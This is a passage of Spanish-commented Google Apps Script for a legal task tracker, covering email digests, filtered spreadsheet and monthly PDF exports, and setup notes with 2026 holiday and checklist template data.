    Logger.log('[digest] FAILED: ' + e.message + '\n' + (e.stack || ''));
    throw e; // que el trigger falle ruidosamente para que aparezca en Apps Script Executions
  }
}

function _sendSpecialistDigest(email, name, buckets, originalRecipient) {
  var nO = buckets.overdue.length, nT = buckets.today.length, nS = buckets.soon.length;
  var total = nO + nT + nS;
  if (total === 0) return;

  var firstName = (name || '').split(' ')[0] || name;
  var subject = '[Legal Tracker] ' + total + (total > 1 ? ' tareas requieren atención' : ' tarea requiere atención');
  if (originalRecipient) subject = '[VISTA PREVIA para ' + originalRecipient + '] ' + subject;

  var headerNote = originalRecipient
    ? '<p style="background:#fffbe6;padding:10px 12px;border-left:3px solid #fa8c16;font-size:13px;margin:0 0 16px;color:#7a4f02;">Vista previa · este resumen estaba destinado a <strong>' + _digestEsc(originalRecipient) + '</strong> (' + _digestEsc(name) + ').</p>'
    : '';

  var html =
    '<div style="font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;color:#222;max-width:680px;">' +
      headerNote +
      '<h2 style="font-family:Georgia,serif;font-weight:400;margin:0 0 4px;font-size:24px;">Hola ' + _digestEsc(firstName) + ',</h2>' +
      '<p style="margin:0 0 20px;color:#555;">Tu agenda de tareas que necesitan atención hoy.</p>' +
      (nO > 0 ? _renderDigestTable(buckets.overdue, 'Vencidas · ' + nO, '#cf1322') : '') +
      (nT > 0 ? _renderDigestTable(buckets.today,   'Vencen hoy · ' + nT, '#d48806') : '') +
      (nS > 0 ? _renderDigestTable(buckets.soon,    'Vencen en 48 horas · ' + nS, '#389e0d') : '') +
      '<p style="margin:28px 0 0;color:#888;font-size:12px;border-top:1px solid #eee;padding-top:12px;">' +
        'Abrir el tracker: <a href="' + _digestEsc(WEB_APP_URL) + '" style="color:#1565c0;">' + _digestEsc(WEB_APP_URL) + '</a><br>' +
        'Recibís este email porque tenés tareas asignadas en Legal Tracker.' +
      '</p>' +
    '</div>';

  MailApp.sendEmail({ to: email, subject: subject, htmlBody: html, name: 'Legal Tracker' });
}

function _sendManagerDigest(email, team, teamTasks, originalRecipient) {
  var nO = teamTasks.filter(function(t){ return t.etaDays < 0; }).length;
  var nT = teamTasks.filter(function(t){ return t.etaDays === 0; }).length;
  var nS = teamTasks.filter(function(t){ return t.etaDays > 0; }).length;

  var overdueByPerson = {};
  teamTasks.forEach(function(t){
    if (t.etaDays >= 0) return;
    var n = (t.resp || '—').trim();
    overdueByPerson[n] = (overdueByPerson[n] || 0) + 1;
  });
  var top3 = Object.keys(overdueByPerson)
    .map(function(n){ return { name: n, count: overdueByPerson[n] }; })
    .sort(function(a, b){ return b.count - a.count; })
    .slice(0, 3);

  var country = team.country || team.code;
  var subject = '[Legal Tracker · ' + country + '] Resumen del equipo — ' + nO + ' vencidas';
  if (originalRecipient) subject = '[VISTA PREVIA para ' + originalRecipient + '] ' + subject;

  var headerNote = originalRecipient
    ? '<p style="background:#fffbe6;padding:10px 12px;border-left:3px solid #fa8c16;font-size:13px;margin:0 0 16px;color:#7a4f02;">Vista previa · este resumen estaba destinado a <strong>' + _digestEsc(originalRecipient) + '</strong> (líder de ' + _digestEsc(country) + ').</p>'
    : '';

  var top3Html = top3.length === 0
    ? '<p style="color:#888;font-style:italic;margin:0;">Nadie con tareas vencidas. ✓</p>'
    : '<ol style="padding-left:20px;margin:0;">' + top3.map(function(p){
        return '<li style="margin:4px 0;"><strong>' + _digestEsc(p.name) + '</strong> — ' + p.count + ' vencida' + (p.count > 1 ? 's' : '') + '</li>';
      }).join('') + '</ol>';

  var html =
    '<div style="font-family:-apple-system,BlinkMacSystemFont,Segoe UI,Helvetica,Arial,sans-serif;color:#222;max-width:680px;">' +
      headerNote +
      '<h2 style="font-family:Georgia,serif;font-weight:400;margin:0 0 4px;font-size:24px;">Resumen del equipo · ' + _digestEsc(country) + '</h2>' +
      '<p style="margin:0 0 20px;color:#555;">Resumen agregado del equipo. Por confidencialidad no se listan tareas individuales aquí — abrí el tracker para ver detalle.</p>' +
      '<table style="border-collapse:collapse;margin:0 0 20px;">' +
        '<tr><td style="padding:10px 18px;background:#fff1f0;border-left:3px solid #cf1322;font-size:28px;font-weight:600;line-height:1;">' + nO + '</td><td style="padding:10px 14px;color:#555;font-size:14px;">vencidas</td></tr>' +
        '<tr><td style="padding:10px 18px;background:#fff7e6;border-left:3px solid #d48806;font-size:28px;font-weight:600;line-height:1;">' + nT + '</td><td style="padding:10px 14px;color:#555;font-size:14px;">vencen hoy</td></tr>' +
        '<tr><td style="padding:10px 18px;background:#f6ffed;border-left:3px solid #389e0d;font-size:28px;font-weight:600;line-height:1;">' + nS + '</td><td style="padding:10px 14px;color:#555;font-size:14px;">vencen en 48h</td></tr>' +
      '</table>' +
      '<h3 style="font-family:Georgia,serif;font-weight:400;margin:16px 0 8px;font-size:16px;">Personas con más tareas vencidas</h3>' +
      top3Html +
      '<p style="margin:28px 0 0;color:#888;font-size:12px;border-top:1px solid #eee;padding-top:12px;">' +
        'Abrir la vista de equipo: <a href="' + _digestEsc(WEB_APP_URL) + '" style="color:#1565c0;">' + _digestEsc(WEB_APP_URL) + '</a>' +
      '</p>' +
    '</div>';

  MailApp.sendEmail({ to: email, subject: subject, htmlBody: html, name: 'Legal Tracker' });
}

function _renderDigestTable(tasks, title, color) {
  if (!tasks || tasks.length === 0) return '';
  var rows = tasks.map(function(t){
    var url = WEB_APP_URL + (WEB_APP_URL.indexOf('?') >= 0 ? '&' : '?') + 'task=' + encodeURIComponent(t.id);
    var prioColor = t.priority === 'Alta' ? '#cf1322' : (t.priority === 'Media' ? '#d48806' : '#888');
    return '<tr>' +
        '<td style="padding:8px 10px;border-bottom:1px solid #f0f0f0;"><a href="' + _digestEsc(url) + '" style="color:#1565c0;text-decoration:none;font-family:Menlo,Consolas,monospace;font-size:12px;">#' + _digestEsc(String(t.id)) + '</a></td>' +
        '<td style="padding:8px 10px;border-bottom:1px solid #f0f0f0;">' + _digestEsc(t.nombre || '—') + '</td>' +
        '<td style="padding:8px 10px;border-bottom:1px solid #f0f0f0;color:#666;font-size:13px;">' + _digestEsc(t.proyecto || '—') + '</td>' +
        '<td style="padding:8px 10px;border-bottom:1px solid #f0f0f0;color:' + prioColor + ';font-size:13px;font-weight:500;">' + _digestEsc(t.priority || '') + '</td>' +
        '<td style="padding:8px 10px;border-bottom:1px solid #f0f0f0;color:#666;font-size:13px;">' + _digestEsc(t.eta || '') + '</td>' +
      '</tr>';
  }).join('');
  return '<h3 style="font-family:Georgia,serif;font-weight:400;color:' + color + ';margin:18px 0 6px;font-size:16px;">' + _digestEsc(title) + '</h3>' +
    '<table style="border-collapse:collapse;width:100%;margin:0 0 8px;font-size:14px;">' +
      '<thead><tr style="background:#fafafa;text-align:left;">' +
        '<th style="padding:6px 10px;color:#888;font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:0.5px;">ID</th>' +
        '<th style="padding:6px 10px;color:#888;font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:0.5px;">Tarea</th>' +
        '<th style="padding:6px 10px;color:#888;font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:0.5px;">Proyecto</th>' +
        '<th style="padding:6px 10px;color:#888;font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:0.5px;">Prioridad</th>' +
        '<th style="padding:6px 10px;color:#888;font-weight:500;font-size:11px;text-transform:uppercase;letter-spacing:0.5px;">ETA</th>' +
      '</tr></thead>' +
      '<tbody>' + rows + '</tbody>' +
    '</table>';
}

function _digestEsc(s) {
  return String(s == null ? '' : s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;');
}

// ════════════════════════════════════════════════════════════════
// TELEMETRY · README
// ════════════════════════════════════════════════════════════════
// - Cómo ver los logs: Apps Script editor → "Ejecuciones" (View → Executions).
//   Cada llamada a un entry-point wrappeado emite un JSON con
//   { ts, email, fn, duration, success, error, meta } vía console.info.
//   En GCP Logging filtrá por jsonPayload.fn="updateTaskFields" para ver
//   por función o jsonPayload.success=false para ver errores.
// - Cómo activar la hoja Telemetry: el dueño del spreadsheet crea
//   manualmente una hoja con el nombre exacto 'Telemetry' y columnas
//   ts | email | fn | duration_ms | status | error | meta. A partir de
//   ese momento cada call queda persistido (1 row por call). Sin la hoja,
//   los logs viven solo en Stackdriver y se rotan según política de GCP.
// - Por qué NO loguea el body de las requests: las tareas/proyectos pueden
//   contener nombres de personas, notas confidenciales (cláusulas, montos,
//   contrapartes). Solo loggeamos metadata booleana o counts (ej. hasResp,
//   fieldCount) para correlacionar sin filtrar PII.
// - Entry-points wrappeados (5): getEditorialData, addTask, updateTaskFields,
//   closeTaskById, blockTaskById. El resto (updateTaskField, addProject,
//   uploadDocument, etc.) no está wrappeado para minimizar diff; agregar
//   más siguiendo el mismo patrón si hace falta más visibilidad.

// ════════════════════════════════════════════════════════════════
// FERIADOS 2026 · COPY-PASTE A LA HOJA 'Feriados'
// ════════════════════════════════════════════════════════════════
// Para activar el cálculo en días hábiles excluyendo feriados:
//   1. Crear hoja llamada exactamente 'Feriados' en el spreadsheet del tracker
//   2. Headers en fila 1: pais | fecha | nombre
//   3. Pegar las filas de abajo (sin el // del inicio) a partir de la fila 2
//   4. Esperar hasta 1h (cache TTL) o ejecutar manualmente
//      `CacheService.getScriptCache().remove('feriados_v1')` en el editor
//
// Fuente: calendarios oficiales 2026 — CO Ley Emiliani aplicada, MX Art. 74
// LFT + viernes santo (uso común), CR Ley 2412 + costumbre.
// Verificá contra el calendario oficial de tu país antes de pegar.
//
// COLOMBIA 2026 (18 feriados)
// CO	2026-01-01	Año Nuevo
// CO	2026-01-12	Reyes Magos
// CO	2026-03-23	Día de San José
// CO	2026-04-02	Jueves Santo
// CO	2026-04-03	Viernes Santo
// CO	2026-05-01	Día del Trabajo
// CO	2026-05-18	Ascensión del Señor
// CO	2026-06-08	Corpus Christi
// CO	2026-06-15	Sagrado Corazón
// CO	2026-06-29	San Pedro y San Pablo
// CO	2026-07-20	Día de la Independencia
// CO	2026-08-07	Batalla de Boyacá
// CO	2026-08-17	Asunción de la Virgen
// CO	2026-10-12	Día de la Raza
// CO	2026-11-02	Día de Todos los Santos
// CO	2026-11-16	Independencia de Cartagena
// CO	2026-12-08	Día de la Inmaculada Concepción
// CO	2026-12-25	Navidad
//
// MÉXICO 2026 (8 feriados oficiales + Viernes Santo)
// MX	2026-01-01	Año Nuevo
// MX	2026-02-02	Día de la Constitución
// MX	2026-03-16	Natalicio de Benito Juárez
// MX	2026-04-03	Viernes Santo
// MX	2026-05-01	Día del Trabajo
// MX	2026-09-16	Día de la Independencia
// MX	2026-11-02	Día de Muertos
// MX	2026-11-16	Día de la Revolución
// MX	2026-12-25	Navidad
//
// COSTA RICA 2026 (11 feriados nacionales)
// CR	2026-01-01	Año Nuevo
// CR	2026-04-02	Jueves Santo
// CR	2026-04-03	Viernes Santo
// CR	2026-04-11	Juan Santamaría
// CR	2026-05-01	Día del Trabajo
// CR	2026-07-25	Anexión de Guanacaste
// CR	2026-08-02	Virgen de los Ángeles
// CR	2026-08-15	Día de la Madre
// CR	2026-09-15	Día de la Independencia
// CR	2026-12-01	Abolición del Ejército
// CR	2026-12-25	Navidad

// ════════════════════════════════════════════════════════════════
// TEMPLATES · COPY-PASTE A LA HOJA 'Templates'
// ════════════════════════════════════════════════════════════════
// Cómo activar: el dueño del spreadsheet crea una hoja llamada exactamente
// 'Templates' con dos columnas en la fila 1 (headers):
//     A: tipoTrabajo   B: checklist
// Cada fila siguiente: una plantilla. La columna B contiene un JSON array
// de strings — los ítems del checklist. Cuando un usuario crea una tarea
// con ese tipoTrabajo y deja el campo 'Notas' vacío, el backend pre-rellena
// notas con "- item1\n- item2\n…" (editable luego). Si la hoja no existe,
// se omite el prefill silenciosamente (backwards-compat).
//
// Samples (copiar las filas A-B tal cual; el JSON va en una sola celda B):
//
// A: Revisión NDA
// B: ["Verificar partes", "Jurisdicción aplicable", "Cláusulas IP", "Término", "Confidencialidad recíproca"]
//
// A: Revisión contractual
// B: ["Partes y representación", "Objeto del contrato", "Plazo y vigencia", "Precio y forma de pago", "Resolución / terminación", "Confidencialidad", "Ley aplicable y jurisdicción"]
//
// A: Derecho de petición
// B: ["Identificación del peticionario", "Hechos relevantes", "Pretensión clara", "Fundamento jurídico", "Soportes y anexos", "Plazo legal de respuesta (15 días hábiles)"]
//
// Cómo agregar plantillas custom: nueva fila con el tipoTrabajo exacto que
// usás en el dropdown del form + checklist como JSON array. El cache TTL
// es 1h (clave 'templates_v1') — para forzar refresh inmediato, hacé un
// pequeño edit en cualquier celda de la hoja y esperá <1h o limpiá el
// cache desde el editor de Apps Script. Filas con JSON inválido se loggean
// (Logger.log) y se omiten sin romper la app.

// ════════════════════════════════════════════════════════════════
// EXPORTS · XLSX of filtered tracker + Monthly PDF per country
// ════════════════════════════════════════════════════════════════
// Dos entry-points pensados para presentaciones (board, country leaders).
// Ambos respetan permisos: nunca se exporta una tarea que el usuario no
// vería en la UI (rol + confidencialidad), porque parten de
// getEditorialData() / _buildViewForRole().

// Escapa contenido de usuario para inyectar en HTML (PDF report).
function _pdfEsc(s) {
  if (s == null) return '';
  return String(s)
    .replace(/&/g, '&amp;')
    .replace(/</g, '&lt;')
    .replace(/>/g, '&gt;')
    .replace(/"/g, '&quot;')
    .replace(/'/g, '&#39;');
}

// Carpeta común "Legal Tracker · Exports" en la raíz del Drive del owner.
// Si ya existe se reutiliza; si no, se crea (no es destructivo, solo lectura/append).
function _getOrCreateExportsFolder() {
  var name = 'Legal Tracker · Exports';
  var it = DriveApp.getFoldersByName(name);
  if (it.hasNext()) return it.next();
  return DriveApp.createFolder(name);
}

// Aplica los filtros del UI (mismos que EDT en el frontend) sobre tareas
// ya pre-filtradas por rol + confidencialidad.
function _applyExportFilters(tasks, filters) {
  filters = filters || {};
  var out = tasks.slice();
  // status: 'all'|'overdue'|'today'|'blocked' (mismo enum que EDT.filter) o nombre de estado literal.
  if (filters.status && filters.status !== 'ALL' && filters.status !== 'all') {
    var st = String(filters.status);
    if (st === 'overdue') {
      out = out.filter(function(t){ return typeof t.etaDays === 'number' && t.etaDays < 0 && t.status !== 'Listo'; });
    } else if (st === 'today') {
      out = out.filter(function(t){ return t.etaDays === 0 && t.status !== 'Listo'; });
    } else if (st === 'blocked') {
      out = out.filter(function(t){ return t.status === 'Bloqueado'; });
    } else if (st === 'open' || st === 'active') {
      out = out.filter(function(t){ return t.status !== 'Listo'; });
    } else {
      // Literal status name ("En curso", "Pendiente", etc.)
      out = out.filter(function(t){ return (t.status || '') === st; });
    }
  }
  if (filters.country && filters.country !== 'ALL') {
    var cc = String(filters.country);
    out = out.filter(function(t){ return (t.pais || '') === cc; });
  }
  if (filters.project && filters.project !== 'ALL') {
    var pf = String(filters.project);
    out = out.filter(function(t) {
      return String(t.proyectoId || '') === pf || (t.proyecto || '') === pf;
    });
  }
  if (filters.owner && filters.owner !== 'ALL') {
    var ow = String(filters.owner).toLowerCase();
    out = out.filter(function(t){ return (t.resp || '').toLowerCase() === ow; });
  }
  if (filters.confidentiality && filters.confidentiality !== 'ALL') {
    var cf = String(filters.confidentiality).toLowerCase();
    out = out.filter(function(t) {
      var lvl = (t.confidencialidad || 'estandar').toString().trim().toLowerCase() || 'estandar';
      return lvl === cf;
    });
  }
  if (filters.myOnly && filters.search) {
    // No-op placeholder, mantained for symmetry with frontend search if needed.
  }
  if (filters.search) {
    var s = String(filters.search).toLowerCase();
    out = out.filter(function(t) {
      return ((t.id || '') + '').toLowerCase().indexOf(s) >= 0
          || ((t.nombre || '') + '').toLowerCase().indexOf(s) >= 0
          || ((t.resp || '') + '').toLowerCase().indexOf(s) >= 0
          || ((t.proyecto || '') + '').toLowerCase().indexOf(s) >= 0
          || ((t.tipoTrabajo || '') + '').toLowerCase().indexOf(s) >= 0;
    });
  }
  return out;
}

// Entry-point: genera un Spreadsheet (XLSX abrible en Google Sheets) con la
// vista filtrada actual del tracker. Devuelve la URL del archivo.
function exportTrackerXLSX(filters) {
  return _telemetry('exportTrackerXLSX', function() {
    return _exportTrackerXLSXImpl(filters);
  }, { hasFilters: !!filters });
}

function _exportTrackerXLSXImpl(filters) {
  // getEditorialData() ya aplica el filtrado por rol + confidencialidad
  // (a través de _buildViewForRole). Nunca se exporta lo que el usuario
  // no podría ver en la UI.
  var data = getEditorialData();
  var tasks = (data && data.tasks) || [];

  // Filtros del UI encima del set rol-filtrado.
  tasks = _applyExportFilters(tasks, filters);

  var tz = 'America/Bogota';
  var stamp = Utilities.formatDate(new Date(), tz, 'yyyy-MM-dd HH:mm');
  var fileName = 'Legal Tracker Export ' + stamp;
  var ss = SpreadsheetApp.create(fileName);
  var sheet = ss.getActiveSheet();
  sheet.setName('Tracker');

  var headers = ['ID','Tarea','Responsable','País','Líder','Estado','Prioridad','Plazo','ETA','Creada','Proyecto','Tipo','Riesgo','Contraparte','Confidencialidad','Notas'];
  sheet.getRange(1, 1, 1, headers.length).setValues([headers]).setFontWeight('bold');

  var rows = tasks.map(function(t) {
    var notes = (t.notas || '').toString();
    if (notes.length > 500) notes = notes.substring(0, 500) + '…';
    var counterparty = t.contraparte || t.counterparty || '';
    return _sanitizeRow([
      t.id || '',
      t.nombre || '',
      t.resp || '',
      t.pais || '',
      t.lider || '',
      t.status || '',
      t.priority || '',
      t.deadline || '',
      t.eta || '',
      t.creado || '',
      t.proyecto || (t.proyectoId ? ('#' + t.proyectoId) : ''),
      t.tipoTrabajo || '',
      t.riesgo || '',
      counterparty,
      t.confidencialidad || 'estandar',
      notes
    ]);
  });
  if (rows.length > 0) {
    sheet.getRange(2, 1, rows.length, headers.length).setValues(rows);
  }
  sheet.setFrozenRows(1);
  try { sheet.autoResizeColumns(1, headers.length); } catch (e) {}

  // Mover a la carpeta de exports + compartir con el usuario.
  var file = DriveApp.getFileById(ss.getId());
  try {
    var folder = _getOrCreateExportsFolder();
    // En API legacy, addFile + removeFile from root para mover.
    folder.addFile(file);
    try { DriveApp.getRootFolder().removeFile(file); } catch (e) {}
  } catch (e) {
    // Si falla el move, el archivo sigue accesible en la raíz del owner.
  }
  try {
    var email = '';
    try { email = Session.getActiveUser().getEmail() || ''; } catch (e) {}
    if (email) file.addEditor(email);
  } catch (e) {}

  return {
    success: true,
    url: file.getUrl(),
    fileName: fileName,
    rowCount: rows.length
  };
}

// Entry-point: PDF mensual por país con KPIs, cierres, abiertas al EOM y
// top performers/proyectos. countryCode ej 'CO'; monthISO ej '2026-05'.
function exportMonthlyCountryPDF(countryCode, monthISO) {
  return _telemetry('exportMonthlyCountryPDF', function() {
    return _exportMonthlyCountryPDFImpl(countryCode, monthISO);
  }, { countryCode: countryCode || '', monthISO: monthISO || '' });
}

function _exportMonthlyCountryPDFImpl(countryCode, monthISO) {
  if (!countryCode) throw new Error('Falta countryCode.');
  if (!monthISO || !/^\d{4}-\d{2}$/.test(monthISO)) throw new Error('monthISO debe tener formato YYYY-MM.');

  var ctx = _getAuthContext();
  // Auth: solo head o manager del país solicitado.
  if (ctx.role !== 'head') {
    if (ctx.role !== 'manager' || !ctx.user || ctx.user.code !== countryCode) {
      throw new Error('No autorizado');
    }
  }

  var parts = monthISO.split('-');
  var year = parseInt(parts[0], 10);
  var monthIdx = parseInt(parts[1], 10) - 1; // 0-indexed JS
  var monthStart = new Date(year, monthIdx, 1, 0, 0, 0);
  var monthEnd   = new Date(year, monthIdx + 1, 1, 0, 0, 0); // exclusive
  var monthLabel = Utilities.formatDate(monthStart, 'America/Bogota', 'MMMM yyyy');

  var raw = _cachedRawData();
  var equipos = raw.equipos || [];
  var allActive = raw.tasks || [];
  var allHist   = raw.historial || [];

  function inCountry(t) {
    var cc = t.pais || getCountryForMember(t.resp, equipos);
    return cc === countryCode;
  }

  var activeC = allActive.filter(inCountry);
  var histC   = allHist.filter(inCountry);

  function parseCreado(t) {
    if (!t.creadoRaw) return null;
    try { return new Date(t.creadoRaw); } catch (e) { return null; }
  }
  function parseCerrado(t) {
    if (!t.cerrado) return null;
    // 'dd/MM/yyyy'
    var p = t.cerrado.split('/');
    if (p.length !== 3) return null;
    var d = parseInt(p[0],10), m = parseInt(p[1],10)-1, y = parseInt(p[2],10);
    if (isNaN(d) || isNaN(m) || isNaN(y)) return null;
    return new Date(y, m, d);
  }
  function inMonth(date) {
    if (!date) return false;
    return date >= monthStart && date < monthEnd;
  }

  // 1) Opened in month (active + historial — la tarea puede haberse abierto y cerrado en el mismo mes).
  var openedInMonth = activeC.concat(histC).filter(function(t) {
    var c = parseCreado(t);
    return inMonth(c);
  });

  // 2) Closed in month (de historial — wsHistorial guarda cerrado).
  var closedInMonth = histC.filter(function(t) {
    return inMonth(parseCerrado(t));
  });

  // 3) Overdue at EOM: tareas abiertas (no cerradas antes del EOM) con deadline < monthEnd.
  // Conjunto = activas hoy con deadline < monthEnd  ∪  historial que se cerró DESPUÉS de monthEnd (todavía estaban abiertas en EOM) con deadline < monthEnd.
  // Como aproximación honesta usamos activas hoy + historial cerrado después.
  function deadlineBeforeEOM(t) {
    if (!t.deadlineISO) return false;
    try {
      var dl = new Date(t.deadlineISO + 'T00:00:00');
      return dl < monthEnd;
    } catch (e) { return false; }
  }
  var stillOpenAtEOM = activeC.filter(function(t) {
    // todavía abiertas (no cerradas) y creadas antes del EOM
    var c = parseCreado(t);
    return c && c < monthEnd && t.status !== 'Listo';
  }).concat(histC.filter(function(t) {
    var c = parseCreado(t);
    var cl = parseCerrado(t);
    return c && c < monthEnd && cl && cl >= monthEnd;
  }));
  var overdueAtEOM = stillOpenAtEOM.filter(deadlineBeforeEOM);

  // 4) On-time %: de las cerradas en el mes, cuántas dentro de SLA.
  var slaLimits = { 'Alta': 2, 'Media': 5, 'Baja': 7 };
  var onTime = 0;
  closedInMonth.forEach(function(t) {
    var c = parseCreado(t);
    var cl = parseCerrado(t);
    if (!c || !cl) return;
    var biz = countBizDays(c, cl);
    var lim = slaLimits[t.priority] || 5;
    if (biz <= lim) onTime++;
  });
  var onTimePct = closedInMonth.length === 0 ? null : Math.round((onTime / closedInMonth.length) * 100);

  // 5) Top 5 members por # cerradas en mes.
  var perMember = {};
  closedInMonth.forEach(function(t) {
    var k = t.resp || '—';
    perMember[k] = (perMember[k] || 0) + 1;
  });
  var topMembers = Object.keys(perMember).map(function(k){ return { name: k, count: perMember[k] }; })
    .sort(function(a,b){ return b.count - a.count; }).slice(0, 5);

  // 6) Top 5 proyectos por # cerradas en mes.
  var perProj = {};
  closedInMonth.forEach(function(t) {
    var k = t.proyecto || (t.proyectoId ? ('#' + t.proyectoId) : '—');
    perProj[k] = (perProj[k] || 0) + 1;
  });
  var topProjects = Object.keys(perProj).map(function(k){ return { name: k, count: perProj[k] }; })
    .sort(function(a,b){ return b.count - a.count; }).slice(0, 5);

  // Build HTML for the PDF.
  var countryEntry = equipos.filter(function(e){ return e.code === countryCode; })[0] || {};
  var countryName = countryEntry.country || countryCode;
  var generatedAt = Utilities.formatDate(new Date(), 'America/Bogota', 'dd/MM/yyyy HH:mm');

  function statCard(label, value, sub) {
    return '<div class="card">'
      + '<div class="label">' + _pdfEsc(label) + '</div>'
      + '<div class="value">' + _pdfEsc(String(value)) + '</div>'
      + (sub ? '<div class="sub">' + _pdfEsc(sub) + '</div>' : '')
      + '</div>';
  }

  function rowsClosed(arr) {
    if (!arr.length) return '<tr><td colspan="5" class="empty">No hay tareas cerradas en este mes.</td></tr>';
    return arr.map(function(t) {
      var c = parseCreado(t), cl = parseCerrado(t);
      var biz = (c && cl) ? countBizDays(c, cl) : null;
      var lim = slaLimits[t.priority] || 5;
      var sla = (biz == null) ? '—' : (biz <= lim ? 'En tiempo (' + biz + 'd ≤ ' + lim + 'd)' : 'Fuera de tiempo (' + biz + 'd > ' + lim + 'd)');
      return '<tr>'
        + '<td>' + _pdfEsc(t.id) + '</td>'
        + '<td>' + _pdfEsc(t.nombre || '') + '</td>'
        + '<td>' + _pdfEsc(t.resp || '') + '</td>'
        + '<td>' + _pdfEsc(t.cerrado || '') + '</td>'
        + '<td>' + _pdfEsc(sla) + '</td>'
        + '</tr>';
    }).join('');
  }
  function rowsOpen(arr) {
    if (!arr.length) return '<tr><td colspan="5" class="empty">No hay tareas abiertas al cierre del mes.</td></tr>';
    return arr.map(function(t) {
      return '<tr>'
        + '<td>' + _pdfEsc(t.id) + '</td>'
        + '<td>' + _pdfEsc(t.nombre || '') + '</td>'
        + '<td>' + _pdfEsc(t.resp || '') + '</td>'
        + '<td>' + _pdfEsc(t.priority || '') + '</td>'
        + '<td>' + _pdfEsc(t.deadline || '') + '</td>'
        + '</tr>';
    }).join('');
  }
  function rowsTop(arr, kind) {
    if (!arr.length) return '<tr><td colspan="2" class="empty">Sin datos.</td></tr>';
    return arr.map(function(r) {
      return '<tr><td>' + _pdfEsc(r.name) + '</td><td>' + r.count + ' cerradas</td></tr>';
    }).join('');
  }

  var html = ''
    + '<!doctype html><html><head><meta charset="utf-8">'
    + '<style>'
    +   'body { font-family: Arial, Helvetica, sans-serif; color: #1a1a1a; padding: 28px; }'
    +   'h1 { font-size: 22px; margin: 0 0 4px 0; }'
    +   '.eyebrow { font-size: 11px; letter-spacing: 1px; text-transform: uppercase; color: #888; margin-bottom: 6px; }'
    +   '.lede { font-size: 12px; color: #555; margin-bottom: 18px; }'
    +   '.kpis { display: table; width: 100%; border-collapse: separate; border-spacing: 8px; margin-bottom: 18px; }'
    +   '.card { display: table-cell; border: 1px solid #ddd; padding: 10px 12px; border-radius: 4px; width: 25%; }'
    +   '.card .label { font-size: 10px; color: #777; text-transform: uppercase; letter-spacing: 0.5px; }'
    +   '.card .value { font-size: 22px; font-weight: bold; margin-top: 4px; }'
    +   '.card .sub { font-size: 10px; color: #888; margin-top: 2px; }'
    +   'h2 { font-size: 14px; margin: 20px 0 8px 0; border-bottom: 1px solid #eee; padding-bottom: 4px; }'
    +   'table.data { width: 100%; border-collapse: collapse; font-size: 11px; }'
    +   'table.data th, table.data td { padding: 6px 8px; border-bottom: 1px solid #eee; text-align: left; vertical-align: top; }'
    +   'table.data th { background: #f7f7f7; font-weight: bold; }'
    +   '.empty { color: #999; font-style: italic; text-align: center; padding: 12px; }'
    +   '.two-col { display: table; width: 100%; border-spacing: 12px 0; }'
    +   '.two-col > div { display: table-cell; width: 50%; vertical-align: top; }'
    +   '.footer { margin-top: 24px; padding-top: 8px; border-top: 1px solid #eee; font-size: 10px; color: #999; }'
    + '</style></head><body>'
    + '<div class="eyebrow">' + _pdfEsc(countryCode) + ' · Legal Tracker</div>'
    + '<h1>Reporte mensual · ' + _pdfEsc(monthLabel) + '</h1>'
    + '<div class="lede">Actividad del equipo de ' + _pdfEsc(countryName) + ' durante ' + _pdfEsc(monthLabel) + '.</div>'
    + '<div class="kpis">'
    +   statCard('Abiertas', openedInMonth.length, 'tareas creadas en el mes')
    +   statCard('Cerradas', closedInMonth.length, 'tareas cerradas en el mes')
    +   statCard('Vencidas al cierre', overdueAtEOM.length, 'abiertas pasado el plazo')
    +   statCard('% en tiempo', onTimePct == null ? '—' : (onTimePct + '%'), onTimePct == null ? 'sin cierres' : 'dentro de SLA')
    + '</div>'
    + '<h2>Tareas cerradas en el mes</h2>'
    + '<table class="data">'
    +   '<thead><tr><th>ID</th><th>Tarea</th><th>Responsable</th><th>Cerrada</th><th>Resultado SLA</th></tr></thead>'
    +   '<tbody>' + rowsClosed(closedInMonth) + '</tbody>'
    + '</table>'
    + '<h2>Aún abiertas al cierre del mes</h2>'
    + '<table class="data">'
    +   '<thead><tr><th>ID</th><th>Tarea</th><th>Responsable</th><th>Prioridad</th><th>Plazo</th></tr></thead>'
    +   '<tbody>' + rowsOpen(stillOpenAtEOM) + '</tbody>'
    + '</table>'
    + '<div class="two-col">'
    +   '<div>'
    +     '<h2>Top responsables</h2>'
    +     '<table class="data"><tbody>' + rowsTop(topMembers, 'member') + '</tbody></table>'
    +   '</div>'
    +   '<div>'
    +     '<h2>Top proyectos</h2>'
    +     '<table class="data"><tbody>' + rowsTop(topProjects, 'project') + '</tbody></table>'
    +   '</div>'
    + '</div>'
    + '<div class="footer">Generado el ' + _pdfEsc(generatedAt) + ' · Confidencial — uso interno únicamente.</div>'
    + '</body></html>';

  var pdfBlob = HtmlService.createHtmlOutput(html).getAs('application/pdf');
  var fileName = 'LT_' + countryCode + '_' + monthISO + '.pdf';
  pdfBlob.setName(fileName);
  var folder = _getOrCreateExportsFolder();
  var file = folder.createFile(pdfBlob);
  try {
    var email = '';
    try { email = Session.getActiveUser().getEmail() || ''; } catch (e) {}
    if (email) file.addEditor(email);
  } catch (e) {}

  return {
    success: true,
    url: file.getUrl(),
    fileName: fileName
  };
}

// ════════════════════════════════════════════════════════════════
// SETUP · ONE-SHOT SHEET INITIALIZATION
// ════════════════════════════════════════════════════════════════
// Función que crea/migra todas las hojas y columnas necesarias para
// activar las features de v3.7+ (digest, biz days, templates, conflict).
// Idempotente: corrida múltiple no rompe ni duplica datos.
//
// Cómo correr: en el editor de Apps Script, dropdown de funciones →
// `setupSheets` → Run. Mira `Logger` (View → Executions) para el reporte.
//
// Qué hace:
//   1. Crea hoja `Feriados` (cols pais|fecha|nombre) + 37 filas CO/MX/CR 2026
//   2. Crea hoja `Templates` (cols tipoTrabajo|checklist) + 3 samples (NDA, Contractual, Petición)
//   3. Agrega col 19 = 'Contraparte' en `Tracking Activo` (header en row 3)
//   4. Agrega col 17 = 'ContrapartesConflicto' en `Proyectos` (header en row 1)
//   5. Limpia caches (feriados_v1, templates_v1, tracker_data_v1)
//
// No sobreescribe datos existentes — si una hoja ya tiene rows o una
// columna ya tiene header distinto, lo loggea como WARNING y skipea.

